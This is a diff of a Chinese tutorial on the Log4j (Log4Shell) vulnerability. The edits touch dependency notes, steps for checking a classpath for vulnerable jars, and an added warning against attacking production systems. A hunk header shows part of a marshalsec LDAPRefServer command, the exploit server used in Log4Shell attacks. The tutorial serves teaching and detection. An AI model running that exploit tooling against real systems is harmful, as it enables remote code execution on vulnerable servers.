@@ -33,7 +33,7 @@ java有很多优秀的日志框架，并且设计是解耦的。接口层比如�
 
 `log4j`只是Apache出品的java日志框架的一种实现，所以不是说用了`Tomcat`就一定用了`log4j`框架输出日志，主要看应用是集成了哪种日志框架。
 
-`log4j2`的集成需要在`pom.xml`中引入依赖：
+使用`sl4j` + `log4j2`需要在`pom.xml`中引入依赖：
 
 ```shell
 <dependency>
@@ -42,6 +42,8 @@ java有很多优秀的日志框架，并且设计是解耦的。接口层比如�
     <version>1.7.5</version>
 </dependency>
 ```
+
+> 本项目demo中没有使用`sl4j`，直接引入`log4j-api:2.14.1.jar`和`log4j-core:2.14.1.jar`。
 
 简单的配置文件`log4j.properties`的demo如下：
 
@@ -65,7 +67,7 @@ log4j.appender.STDOUT.layout.ConversionPattern=%5p [%t] (%F\:%L) - %m%n
 `log4j`存在漏洞的版本是`2.x <= 2.15-rc1`。查看对应的依赖是否存在有漏洞版本即可。具体方法：
 
 1. maven或者gradle构建项目，查看对应的配置文件，是否有相应的log4j依赖。
-2. 非第三方构建项目，找到项目的依赖`CLASSPAHT`，查看是否有相应的log4j相关jar（`log4j-api-***.jar`、`log4j-core-***.jar`）包依赖。
+2. 非第三方构建项目，找到项目的依赖`CLASSPAHT`，查看是否有相应的log4j相关jar（`log4j-api:***.jar`、`log4j-core:***.jar`）包依赖。
 3. 查看`CLASSPAHT`下是否有`log4j.properties`配置文件。
 
 > 查看`CLASSPAHT`的办法可以用`ps -ef |grep $PID`，查到对应的进程信息里面`-cp`参数值为`classpath`。对于springboot项目可以使用命令`mkdir xxx && cd xxx && jar xvf ../xx.jar`解压后找到`lib`目录查看。
@@ -174,6 +176,8 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 > 如果是现场不方便重新打包，可将包下载，替换目标容器`lib`下对应的jar包。
 
 <h4 i="3.3">3.3 攻方"有道"</h4>
+
+<p style="color: red">本demo示例基于对技术的好奇和探索而创建，切忌用于线上生产项目的攻击！！！</p>
 
 <h3 id="4">4. 引用</h3>
 
